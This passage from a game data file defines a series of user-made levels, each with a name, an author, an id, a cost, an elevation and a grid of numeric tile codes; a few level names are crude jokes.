6,14,1,0,0,1,114,14,76,76,66,66,66,66,1,1,76,76,76,76,14,14,1,0,0,1,114,14,14,76,76,76,76,1,76,76,76,76,76,14,14,1,1,0,0,1,114,114,14,76,76,76,76,76,76,76,14,14,14,14,1,1,0,0,0,1,114,114,14,76,76,76,76,14,14,14,14,1,1,1,1,0,0,0,0,1,114,114,14,14,76,76,14,14,1,1,1,1,0,0,0,0,0,0,0,1,114,114,114,14,76,14,14,114,1,1,0,0,0,0,0,0,0,0,0,1,1,114,114,2,2,14,114,114,1,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Strafe Holds",author="MoistNoodlez",id="#1660098620",direction="forward",cost=154,elevation=0,map=[0,0,0,0,0,0,0,14,2,2,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,95,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,96,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,97,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,98,98,98,98,98,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,99,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,101,101,101,101,101,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,102,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,103,103,103,103,103,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,104,0,0,0,0,0,0,0,0]});
maps.push({name="Wacky Tunnel",author="MoistNoodlez",id="#1660098909",direction="forward",cost=276,elevation=0,map=[0,0,0,0,1,1,1,1,2,2,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,65,114,114,114,114,114,90,114,1,0,0,0,0,0,0,0,0,0,0,1,114,114,114,88,114,114,114,65,1,0,0,0,0,0,0,0,0,0,0,1,114,75,114,114,65,114,114,114,1,0,0,0,0,0,0,0,0,0,0,1,114,90,114,88,114,76,65,114,1,0,0,0,0,0,0,0,0,0,0,1,75,114,75,114,90,114,65,114,1,0,0,0,0,0,0,0,0,0,0,1,114,114,75,76,75,90,114,75,1,0,0,0,0,0,0,0,0,0,0,1,114,65,114,90,75,114,90,114,1,0,0,0,0,0,0,0,0,0,0,1,88,114,90,114,114,90,114,76,1,0,0,0,0,0,0,0,0,0,0,1,114,75,114,90,75,90,65,114,1,0,0,0,0,0,0,0,0,0,0,1,114,65,88,114,76,114,76,114,1,0,0,0,0,0,0,0,0,0,0,1,75,114,114,65,114,75,114,114,1,0,0,0,0,0,0,0,0,0,0,1,114,75,114,88,114,75,88,114,1,0,0,0,0,0,0,0,0,0,0,1,88,114,76,114,90,114,114,75,1,0,0,0,0,0,0,0,0,0,0,1,114,65,114,75,114,114,65,114,1,0,0,0,0,0,0,0,0,0,0,1,114,114,75,114,88,88,114,114,1,0,0,0,0,0,0,0,0,0,0,1,75,114,114,90,75,114,65,114,1,0,0,0,0,0,0,0,0,0,0,1,114,90,88,114,114,114,114,75,1,0,0,0,0,0,0,0,0,0,0,1,88,114,114,114,114,114,90,88,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,2,2,1,1,1,1,0,0,0,0,0,0]});
maps.push({name="Uturn",author="MoistNoodlez",id="#1660099197",direction="forward",cost=253,elevation=0,map=[1,1,1,1,0,1,133,133,1,0,0,1,2,2,1,0,0,0,0,0,1,132,132,1,0,1,14,14,1,0,0,1,14,14,1,0,0,0,0,0,1,14,14,1,0,1,131,131,1,0,0,1,14,14,1,0,0,0,0,0,1,14,14,1,0,1,14,14,1,0,0,1,14,14,1,0,0,0,0,0,1,14,14,1,0,1,14,14,1,0,0,1,14,14,1,0,0,0,0,0,1,14,14,1,0,1,14,14,1,0,0,1,14,14,1,0,0,0,0,0,1,14,14,1,0,1,14,14,1,0,0,1,14,14,1,0,0,0,0,0,1,14,14,1,0,1,14,14,1,1,1,1,14,14,1,0,0,0,0,0,1,14,14,1,0,1,14,14,96,14,93,1,14,14,1,0,0,0,0,0,1,14,14,1,0,1,14,14,96,14,94,1,14,14,1,0,0,0,0,0,1,14,14,1,0,1,14,14,1,1,1,1,14,14,1,0,0,0,0,0,1,14,14,1,0,1,14,14,1,0,0,1,14,14,1,0,0,0,0,0,1,14,14,1,0,1,14,14,1,0,0,1,14,14,1,0,0,0,0,0,1,14,14,1,0,1,14,14,1,1,1,1,14,14,1,0,0,0,0,0,1,97,14,1,0,1,14,14,14,95,14,14,14,14,1,0,0,0,0,0,1,14,14,1,0,1,14,14,14,95,14,14,14,14,1,0,0,0,0,0,1,134,134,1,0,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Heart",author="MoistNoodlez",id="#1660100758",direction="forward",cost=453,elevation=0,map=[0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,114,114,114,114,1,1,0,0,0,0,0,0,0,0,0,1,1,100,1,114,114,114,114,114,114,1,1,1,0,0,0,0,0,1,1,1,1,114,1,114,1,114,114,114,114,114,1,1,1,0,0,0,0,1,1,114,114,114,114,1,114,114,114,90,114,114,114,1,1,1,0,0,0,1,1,114,114,114,114,114,1,1,76,90,76,14,114,114,1,1,0,0,0,1,54,54,114,114,90,90,76,76,90,90,90,76,90,114,14,1,1,0,0,1,54,54,54,114,90,76,76,76,90,76,1,1,76,76,14,1,1,1,0,1,1,54,54,114,90,76,90,90,90,1,1,76,76,76,14,14,14,1,0,1,1,1,54,76,76,76,1,1,90,90,90,90,90,76,76,14,14,1,0,1,54,54,54,54,76,76,1,90,90,76,90,76,76,90,1,14,14,1,1,1,1,54,54,54,76,1,1,90,76,76,76,76,90,1,1,76,76,14,1,1,54,1,54,54,54,76,76,76,76,76,90,90,1,1,14,76,76,100,1,54,54,54,54,54,76,76,1,1,76,90,1,1,1,76,76,76,76,1,1,1,1,54,54,54,76,76,14,14,14,1,76,76,76,76,14,76,76,1,0,1,1,54,54,54,1,1,76,14,14,14,14,14,14,14,14,76,1,1,0,1,1,1,54,1,1,1,1,1,1,1,1,76,76,1,1,1,1,0,0,1,1,54,54,1,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,1,54,54,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Liquid Tunnels",author="MoistNoodlez",id="#1660101542",direction="right",cost=348,elevation=-19,map=[0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,124,124,124,124,1,0,0,1,1,1,1,1,1,1,1,1,1,0,0,1,123,123,123,123,1,0,0,1,90,109,75,108,108,75,108,108,1,0,0,1,122,122,122,122,1,0,0,1,109,109,75,108,108,75,108,108,1,0,0,1,121,121,121,121,1,0,0,1,66,66,1,1,1,1,1,95,1,0,0,1,120,120,120,120,1,0,0,1,109,109,1,90,107,107,107,108,1,0,0,1,119,119,119,119,1,0,0,1,109,109,1,107,107,107,107,1,1,0,0,1,118,118,118,118,1,0,0,1,66,66,1,106,1,106,1,1,0,0,0,1,117,117,117,117,1,0,0,1,69,69,1,76,1,76,1,0,0,0,0,1,116,116,116,116,1,0,0,1,69,69,1,78,1,78,1,0,0,0,0,1,115,115,115,115,1,0,0,1,66,66,1,76,1,76,1,0,0,0,0,1,114,114,114,114,1,0,0,1,110,110,1,78,1,78,1,0,0,0,0,1,113,113,113,113,1,1,1,1,65,65,1,76,1,76,1,0,0,0,0,1,112,112,112,112,111,65,111,65,110,110,1,105,1,105,1,0,0,0,0,1,90,90,90,112,111,65,111,65,110,110,1,105,105,105,1,0,0,0,0,1,90,90,90,112,111,65,111,65,110,90,1,105,105,1,1,0,1,0,0,1,1,112,112,1,1,1,1,1,1,1,1,1,105,1,1,1,1,0,0,0,1,93,94,1,0,0,0,0,0,0,1,1,105,105,90,105,2,0,0,0,1,1,1,1,0,0,0,0,0,0,1,1,90,105,105,105,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1]});
maps.push({name="Muspelheim",author="ZpLit",id="#1660130699",direction="forward",cost=438,elevation=-3,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,8,8,8,8,9,90,9,0,0,0,0,0,0,0,0,0,0,90,9,9,8,8,8,8,9,9,9,0,0,0,0,0,0,0,0,0,0,9,9,23,20,8,8,20,22,9,9,0,0,0,0,0,0,97,35,27,0,9,9,18,77,8,8,77,19,9,9,0,27,35,99,0,0,1,1,1,13,9,9,0,0,8,90,0,0,9,90,13,1,1,1,0,1,11,11,10,9,9,90,0,0,8,8,0,0,9,9,9,10,11,11,1,1,76,11,10,9,9,9,0,0,90,8,0,0,9,9,9,10,11,76,1,1,82,21,77,0,9,9,0,0,8,8,0,0,90,9,0,77,21,82,1,1,82,23,77,0,90,9,0,0,91,91,0,0,9,9,0,77,23,82,1,1,82,20,77,0,9,9,0,0,91,91,0,0,9,9,0,77,20,82,1,1,82,22,77,0,9,9,0,0,8,8,0,0,9,9,0,77,22,82,1,1,82,24,77,0,9,9,0,0,7,7,0,0,9,9,0,77,24,82,1,1,82,21,77,0,9,9,77,1,106,106,1,77,9,9,0,77,21,82,1,1,82,24,77,0,10,10,24,1,45,45,1,24,10,10,0,77,24,82,1,1,82,22,77,0,11,11,98,11,95,95,11,96,11,11,0,77,22,82,1,1,82,21,77,77,11,98,11,45,45,45,45,11,96,11,77,77,21,82,1,1,82,24,21,21,23,20,24,45,5,5,45,24,20,23,21,21,24,82,1,1,76,76,76,76,76,76,111,45,5,5,45,111,76,76,76,76,76,76,1,0,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,0]});
maps.push({name="Broken Tower",author="JonStomach",id="#1660165980",direction="right",cost=379,elevation=4,map=[1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,15,92,9,9,92,15,15,15,0,85,16,0,17,17,90,17,17,17,1,1,15,15,9,9,15,15,15,15,0,16,85,0,17,17,17,17,90,17,1,1,15,15,90,9,9,9,49,9,0,85,10,0,11,51,11,11,17,17,1,1,15,15,9,90,9,9,49,9,0,10,85,0,11,51,11,90,17,90,1,1,15,15,9,9,15,15,15,15,0,85,16,0,17,17,11,11,17,17,1,1,15,15,9,9,15,15,4,4,0,16,85,0,17,17,90,11,17,17,1,1,15,15,49,49,15,4,24,24,24,1,1,1,17,17,11,11,17,17,1,1,15,15,9,9,15,4,24,44,44,44,44,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,24,44,44,44,44,1,18,85,12,85,18,85,1,1,16,85,10,85,16,85,1,44,44,44,44,1,85,18,85,12,85,18,1,1,85,16,85,10,85,16,1,44,44,44,93,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,1,1,1,1,1,19,19,13,13,19,19,1,1,17,17,11,11,17,17,17,0,85,18,0,19,90,19,90,13,90,19,1,1,17,17,51,51,17,17,17,0,18,85,0,19,19,19,13,13,19,19,1,1,17,17,11,11,11,11,11,0,85,12,0,13,13,13,13,13,13,13,2,1,17,90,11,11,90,11,11,0,12,85,0,13,13,13,13,90,13,13,2,1,17,17,17,90,17,17,17,0,85,18,0,19,90,19,19,19,19,19,1,1,17,17,17,17,17,90,17,0,18,85,0,19,19,19,90,19,19,19,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Penile Penetration",author="MoistNoodlez",id="#1660173837",direction="forward",cost=250,elevation=-5,map=[0,0,0,0,1,1,1,1,2,2,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,92,92,14,14,14,14,92,92,1,0,0,0,0,0,0,0,0,0,0,0,39,39,39,39,39,39,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,77,77,77,77,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,75,75,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,75,75,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,75,75,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,75,75,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,75,75,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,75,75,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,75,75,54,54,0,0,0,0,0,0,0,0,0,0,24,24,24,24,54,54,75,75,54,54,24,24,24,24,0,0,0,0,0,0,24,24,24,24,54,54,75,75,54,54,24,24,24,24,0,0,0,0,0,0,24,24,24,24,54,54,75,75,54,54,24,24,24,24,0,0,0,0,0,0,24,24,24,24,54,54,75,75,54,54,24,24,24,24,0,0,0,0,0,0,0,0,0,0,77,77,77,77,77,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,2,2,1,1,1,0,0,0,0,0,0,0]});
maps.push({name="Excretion",author="MoistNoodlez",id="#1660174516",direction="forward",cost=272,elevation=-19,map=[0,0,0,0,1,1,1,1,2,2,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,88,64,64,64,64,64,64,88,1,0,0,0,0,0,0,0,0,0,0,1,64,88,64,66,66,64,88,64,1,0,0,0,0,0,0,0,0,0,0,1,88,88,64,69,69,64,88,88,1,0,0,0,0,0,0,0,0,0,0,1,64,88,64,69,69,64,88,64,1,0,0,0,0,0,0,0,0,0,0,1,88,88,64,69,69,64,88,88,1,0,0,0,0,0,0,0,0,0,0,1,64,88,64,69,69,64,88,64,1,0,0,0,0,0,0,0,0,0,0,1,88,88,64,69,69,64,88,88,1,0,0,0,0,0,0,0,0,0,0,1,64,88,64,69,69,64,88,64,1,0,0,0,0,0,0,0,0,0,0,1,88,64,64,69,69,64,64,88,1,0,0,0,0,0,0,0,0,0,0,1,1,95,95,69,69,95,95,1,1,0,0,0,0,0,0,0,0,0,0,0,1,64,64,69,69,64,64,1,0,0,0,0,0,0,0,0,0,0,0,1,1,5,5,67,67,5,5,1,1,0,0,0,0,0,0,0,0,0,0,1,5,90,5,66,66,5,5,90,1,0,0,0,0,0,0,0,0,0,0,1,90,5,90,5,5,5,90,5,1,0,0,0,0,0,0,0,0,0,0,1,5,90,5,5,90,5,5,90,1,0,0,0,0,0,0,0,0,0,0,1,90,5,90,5,5,90,90,5,1,0,0,0,0,0,0,0,0,0,0,1,5,90,5,90,5,5,90,5,1,0,0,0,0,0,0,0,0,0,0,1,90,5,5,95,95,90,5,90,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,2,2,1,1,1,1,0,0,0,0,0,0]});
maps.push({name="Diddle My Nipple",author="MoistNoodlez",id="#1660175059",direction="forward",cost=319,elevation=0,map=[0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,1,12,12,12,12,1,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,88,12,12,12,88,1,1,1,1,1,1,1,0,0,0,1,12,88,12,12,12,12,12,12,12,12,12,12,88,12,12,1,0,0,0,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,0,0,0,1,12,12,12,88,52,52,52,52,52,52,52,52,88,12,88,1,0,0,0,1,12,88,12,52,52,52,52,52,52,52,52,52,52,12,12,1,0,0,0,1,12,12,12,52,52,52,52,4,52,52,52,52,52,12,12,1,0,0,0,1,12,12,12,52,52,52,58,58,58,58,4,52,52,12,12,1,1,0,0,1,12,12,12,52,52,52,58,64,64,58,52,52,52,12,12,12,1,0,0,1,12,12,12,52,52,52,92,64,100,58,52,52,52,12,12,12,1,0,0,1,12,12,12,52,52,52,58,64,64,58,52,52,52,12,88,12,1,0,0,1,1,12,12,52,52,52,58,58,58,58,4,52,52,12,12,12,1,0,0,1,1,12,12,52,52,52,52,4,52,52,52,52,52,12,12,12,1,0,0,0,1,12,12,88,52,52,52,52,52,52,52,52,88,12,12,1,1,0,0,0,1,12,12,12,12,52,52,52,52,52,12,12,12,12,12,1,0,0,0,0,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,0,0,0,0,1,1,12,12,88,12,12,12,12,12,12,12,12,88,12,1,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0]});
maps.push({name="Falls Park",author="MoistNoodlez",id="#1660176782",direction="forward",cost=493,elevation=-5,map=[0,0,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,1,90,14,13,13,14,90,14,14,14,90,14,14,14,14,14,14,1,0,0,1,14,14,13,13,14,14,14,90,14,14,14,90,14,90,14,90,1,0,0,1,90,14,13,13,14,90,14,14,14,90,14,90,14,90,14,90,1,0,0,1,14,14,13,13,14,14,14,90,14,14,14,14,14,14,14,14,1,0,0,1,90,14,13,13,14,90,14,14,14,90,14,14,65,65,65,14,1,0,0,1,14,14,13,13,14,14,14,90,14,14,14,90,67,67,67,14,1,0,0,1,90,14,12,12,14,90,14,14,14,90,65,67,65,65,65,67,1,0,0,1,14,14,12,12,14,14,14,90,14,65,65,67,65,24,24,14,1,0,0,1,90,14,12,12,14,90,14,14,14,90,65,67,65,24,100,14,1,0,0,1,14,14,12,12,14,14,14,90,14,65,65,67,65,24,24,92,1,0,0,1,90,14,12,12,14,90,14,14,14,90,65,67,65,93,94,24,1,0,0,1,14,14,12,12,14,14,14,14,14,14,65,65,1,1,1,1,1,0,0,1,90,14,11,11,10,10,10,10,9,9,14,14,77,93,94,24,1,0,0,1,14,14,11,11,10,10,10,10,9,9,14,14,77,24,93,92,1,0,0,1,90,14,14,14,14,14,14,14,48,48,14,14,77,24,24,14,1,0,0,1,75,75,75,75,75,75,75,14,91,91,14,14,77,24,24,14,1,0,0,1,75,75,77,77,77,75,75,14,48,48,14,14,77,24,24,14,1,0,0,1,75,77,75,75,75,77,75,14,48,48,14,14,14,77,14,90,1,0,0,1,1,1,124,124,124,1,1,1,2,2,1,1,1,1,1,1,1]});
maps.push({name="Outer wall",author="Luffaren",id="#1660257619",direction="left",cost=277,elevation=-19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,67,0,0,0,21,21,21,21,0,0,0,0,0,100,0,0,0,0,0,67,14,90,14,14,20,20,20,20,0,0,5,5,5,39,39,39,0,0,0,0,90,14,14,14,19,19,19,19,0,0,5,65,5,1,1,39,0,0,0,0,14,14,94,14,18,18,18,18,0,0,5,5,5,1,1,39,0,0,0,0,14,14,14,14,17,17,17,17,0,0,2,5,6,7,8,9,10,11,12,13,14,14,94,14,16,16,16,16,0,0,2,5,6,7,8,9,10,11,12,13,14,14,14,14,15,15,15,15,0,0,5,5,6,7,8,9,10,11,12,13,14,14,14,14,14,14,14,14,0,0,1,1,1,1,19,19,19,19,19,19,14,14,14,14,14,14,14,14,14,0,1,119,93,1,90,126,19,19,94,19,14,65,65,90,14,14,90,65,65,67,1,93,119,96,19,19,19,19,19,19,14,65,65,65,65,65,65,65,65,67,1,119,93,1,90,19,18,17,16,15,14,65,65,90,14,14,90,65,65,67,1,1,1,1,19,19,18,17,16,15,14,14,14,14,14,14,14,14,14,0,43,0,41,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,97,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Wet tunneling",author="Luffaren",id="#1660257744",direction="forward",cost=426,elevation=-19,map=[0,0,24,2,2,24,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,24,24,24,24,1,1,90,90,5,5,44,44,44,44,44,1,1,1,0,0,0,127,127,0,1,1,5,5,5,5,43,5,5,5,44,5,5,5,0,0,0,0,0,0,1,1,5,89,5,5,42,5,89,5,44,5,5,5,0,0,0,0,0,0,1,1,90,5,5,90,41,5,5,5,44,5,127,5,0,0,0,0,0,0,1,1,5,5,5,1,20,0,0,0,44,44,44,44,0,0,0,0,0,0,1,1,5,5,5,1,19,0,0,0,44,93,44,100,0,5,5,5,5,5,1,1,66,66,66,1,18,0,0,0,0,135,135,135,0,5,66,66,66,66,1,1,68,68,68,1,17,0,0,0,0,135,135,135,0,5,66,66,66,66,1,1,68,68,68,1,16,0,0,0,0,135,135,135,0,5,66,66,66,66,1,1,68,68,68,1,15,0,0,0,0,135,135,135,0,5,66,66,66,66,1,1,68,68,68,1,14,0,0,0,0,135,135,135,0,5,66,66,66,66,1,1,68,68,68,1,13,0,0,0,0,135,135,135,0,5,66,66,66,66,1,1,68,68,68,1,12,0,0,0,0,135,135,135,0,5,66,66,66,66,69,69,68,68,68,1,11,0,0,0,0,135,135,135,0,5,66,66,66,66,69,69,68,68,68,1,10,0,0,0,0,135,135,135,0,5,66,66,66,66,69,69,68,68,68,1,9,0,0,0,0,135,135,135,0,5,66,66,66,66,1,1,1,7,1,1,8,0,0,0,89,5,5,5,0,5,66,66,66,66,1,94,1,7,93,90,7,0,0,0,5,5,5,5,0,1,1,1,1,1,1,7,7,7,7,7,7,0,0,0,5,2,2,5]});
maps.push({name="Strain",author="Luffaren",id="#1660257775",direction="right",cost=98,elevation=-19,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,24,24,24,0,0,0,0,128,24,24,0,0,0,0,0,0,0,0,0,0,127,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,5,2,0,0,0,0,0,0,0,0,5,21,0,0,0,0,0,0,0,0,5,2,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,5,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,6,0,130,0,0,0,0,0,0,0,19,5,0,0,0,0,0,0,0,0,5,0,130,0,0,0,0,0,18,5,5,0,0,0,0,0,0,0,0,7,5,0,130,130,0,0,17,5,16,5,15,0,0,0,0,0,0,0,0,5,5,0,130,130,5,5,5,5,0,5,5,5,14,0,13,0,0,0,8,5,0,0,5,5,5,0,0,0,0,0,0,0,5,0,0,0,5,5,5,5,94,0,0,0,0,0,0,0,0,0,0,0,5,12,0,0,5,9,5,94,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,5,93,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,0,10,0,5,93,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Opposition",author="Luffaren",id="#1660257801",direction="forward",cost=284,elevation=-5,map=[1,1,1,1,1,1,1,1,1,1,90,19,19,90,19,2,2,19,0,0,0,19,127,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,19,19,93,0,0,0,135,135,135,0,0,0,0,0,0,0,0,0,67,19,100,100,19,67,0,0,135,135,135,0,0,0,0,0,0,0,0,0,67,19,19,19,19,67,0,0,135,135,135,0,0,0,0,0,0,0,0,0,67,19,19,19,19,67,0,0,135,135,135,0,0,0,0,0,0,0,0,0,67,19,94,94,19,67,0,0,135,135,135,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,135,135,135,0,0,0,0,0,0,0,0,0,0,96,96,96,96,0,0,0,135,135,135,0,0,0,0,0,0,0,0,0,0,96,96,96,96,0,0,0,135,135,135,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,135,135,135,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,97,0,135,135,135,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,135,135,135,0,0,0,0,0,0,0,0,0,0,16,16,16,16,0,0,0,135,135,135,19,19,19,90,19,19,19,19,90,19,15,15,15,15,0,0,0,19,19,19,19,19,19,19,19,19,90,19,19,19,14,14,14,14,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,14,2,2,14,0,0]});
maps.push({name="Wet sanctum",author="Luffaren",id="#1660257829",direction="forward",cost=360,elevation=0,map=[0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,119,119,119,119,1,1,0,0,0,0,0,0,0,0,0,0,1,1,119,119,119,119,119,119,119,119,1,1,0,0,0,0,0,0,0,1,119,119,119,119,19,19,19,19,119,119,119,119,1,0,0,0,0,0,1,119,119,119,19,19,19,65,65,19,19,19,119,119,119,1,0,0,0,0,1,119,119,19,19,19,19,65,65,19,19,19,19,119,119,1,0,0,0,1,94,119,19,19,19,19,65,65,65,65,19,19,19,19,119,94,1,0,0,1,119,119,19,19,19,65,65,65,65,65,65,19,19,19,119,119,1,0,1,119,119,19,19,19,65,65,65,65,65,65,65,65,19,19,19,119,119,1,1,89,119,19,65,65,65,65,65,65,65,65,65,65,65,65,19,119,89,1,1,89,119,19,65,65,65,65,65,65,65,65,65,65,65,65,19,119,89,1,1,119,119,19,19,19,65,65,65,65,65,65,65,65,19,19,19,119,119,1,0,1,119,119,19,19,19,65,65,65,65,65,65,19,19,19,119,119,1,0,0,1,93,119,19,19,19,19,65,65,65,65,19,19,19,19,119,93,1,0,0,0,1,119,119,19,19,19,19,65,65,19,19,19,19,119,119,1,0,0,0,0,1,119,119,119,19,19,19,65,65,19,19,19,119,119,119,1,0,0,0,0,0,1,119,119,119,119,19,19,19,19,119,119,119,119,1,0,0,0,0,0,0,0,1,1,119,119,119,119,119,119,119,119,1,1,0,0,0,0,0,0,0,0,0,0,1,1,89,119,119,89,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Inner pools",author="Luffaren",id="#1660316770",direction="forward",cost=329,elevation=-3,map=[1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,119,119,119,119,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,119,119,119,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,119,119,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,119,119,119,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,119,118,118,119,1,39,0,0,39,0,0,39,0,0,0,0,0,0,0,1,119,117,117,119,1,1,1,1,1,1,1,1,1,1,116,1,116,1,1,1,116,16,16,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,1,1,116,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,116,1,1,116,16,16,90,65,65,65,65,16,90,65,65,65,65,90,16,16,116,1,1,116,16,94,16,65,65,65,65,89,16,65,65,65,65,16,94,16,116,1,1,116,16,16,90,65,65,65,65,16,90,65,65,65,65,90,16,16,116,1,1,116,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,116,1,1,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,16,16,116,1,1,1,1,1,1,1,1,1,1,91,1,1,1,1,1,116,116,116,116,1,1,119,119,93,119,1,1,1,1,116,1,0,0,0,1,116,89,89,116,1,1,93,119,119,119,119,118,117,116,116,1,0,0,0,1,90,116,116,90,1,1,93,119,119,89,1,1,1,1,1,1,0,0,0,1,116,116,116,116,1,1,119,119,93,119,1,0,0,0,0,0,0,0,0,1,116,116,116,116,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,1,1,2,2,1,1]});
